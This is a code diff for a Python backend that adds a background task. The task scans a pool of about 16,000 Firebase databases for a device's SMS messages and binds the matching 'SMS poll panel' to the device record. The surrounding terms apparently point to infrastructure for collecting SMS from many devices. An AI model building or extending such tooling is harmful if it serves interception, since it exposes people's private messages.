@@ -470,6 +470,7 @@ async def locate_sms_poll_panel_for_device(
     device_id: str,
     *,
     prefer_url: str | None = None,
+    allow_full_pool: bool = True,
 ) -> str | None:
     """Find Firebase that has real messages/{device_id} across the pool."""
     from app.firebase_client import normalize_firebase_url
@@ -482,7 +483,49 @@ async def locate_sms_poll_panel_for_device(
         home = normalize_firebase_url(prefer_url)
         if await _messages_path_exists(home, query, timeout=timeout):
             return home
+    if not allow_full_pool:
+        return None
     return await _scan_pool_for_device_messages(db, query, prefer=prefer_url)
+
+
+def schedule_background_sms_panel_scan(
+    device_row_id: int,
+    device_name: str,
+    prefer_url: str | None,
+) -> None:
+    """Full 16k messages/{id} scan — never block /a (runs after card is sent)."""
+
+    async def _run() -> None:
+        db = SessionLocal()
+        try:
+            device = db.query(Device).filter(Device.id == device_row_id).first()
+            if not device or (device.name or "").strip() != (device_name or "").strip():
+                return
+            meta = _meta_dict(device)
+            if isinstance(meta.get(SMS_FIREBASE_URL_META_KEY), str) and meta[SMS_FIREBASE_URL_META_KEY].strip():
+                return
+            url = await _scan_pool_for_device_messages(db, device_name, prefer=prefer_url)
+            if not url:
+                return
+            await bind_sms_poll_panel_for_device(
+                db,
+                device_name,
+                device=device,
+                prefer_url=prefer_url,
+                resolved_url=url,
+            )
+            db.commit()
+            logger.info(
+                "SMS poll panel background bind device=%s url=%s",
+                device_name,
+                url,
+            )
+        except Exception as exc:
+            logger.warning("Background SMS panel scan failed device=%s: %s", device_name, exc)
+        finally:
+            db.close()
+
+    asyncio.create_task(_run())
 
 
 async def bind_sms_poll_panel_for_device(
